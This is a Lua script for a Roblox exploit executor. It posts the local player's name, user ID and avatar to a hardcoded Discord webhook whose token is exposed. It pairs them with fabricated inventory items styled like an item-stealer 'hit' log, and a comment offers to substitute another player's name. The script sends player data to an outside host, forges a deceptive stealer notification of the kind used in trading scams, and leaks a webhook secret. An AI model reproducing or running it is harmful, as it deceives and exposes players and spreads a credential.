local webhook = "https://discord.com/api/webhooks/1382134335238443090/XCkrCU6atsiZi4PecJDz0MbWyH_XN-sm1J-UDsh2h_4SNT4s1pJ4gsUqa5ptaXh2pEOx"

local player = game:GetService("Players").LocalPlayer
local HttpService = game:GetService("HttpService")

local message = {
    content = nil,
    username = player.Name, -- or hardcode "Vyn_korzz" if needed
    avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=100&height=100&format=png",
    embeds = {{
        title = "**" .. player.Name .. "**",
        description = "_ _\n**🪙 Sheckles  **: 213b\n_ _\n_ _\n**🎒 | Inventory**\n_ _\n_ _",
        color = 2750290,
        fields = {
            {
                name = "> 🐶 | Pets Equipped",
                value = "```\n   [Age: 01] Bloodmoon Owl\n‎ ‎ ‎ ‎[Age: 75] Disco Bee\n```",
                inline = false
            },
            {
                name = "> 🥚 | Pets & Eggs",
                value = "```\n   [2x] Bug Egg\n‎ ‎ ‎ ‎[3x] Dragonfly\n```",
                inline = false
            },
            {
                name = "> 🔧 | Gears",
                value = "```\n   [2x] Advanced Sprinkler\n‎ ‎ ‎ ‎[3x] Master Sprinkler\n```",
                inline = false
            },
            {
                name = "> 🌱 | Seeds",
                value = "```\n   [2x] Beanstalk   \n‎ ‎ ‎ ‎[3x] Mango\n```",
                inline = false
            },
            {
                name = "⠀", -- invisible space to replicate spacing
                value = "‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎",
                inline = false
            }

        }
    }}
}

local req = (syn and syn.request) or (http and http.request) or request
if req then
    req({
        Url = webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(message)
    })
    pcall(function()
        game.StarterGui:SetCore("ChatMakeSystemMessage", { Text = "[DEBUG] ✅ Webhook sent!" })
    end)
else
    pcall(function()
        game.StarterGui:SetCore("ChatMakeSystemMessage", { Text = "[DEBUG] ❌ HTTP requests not supported." })
    end)
end
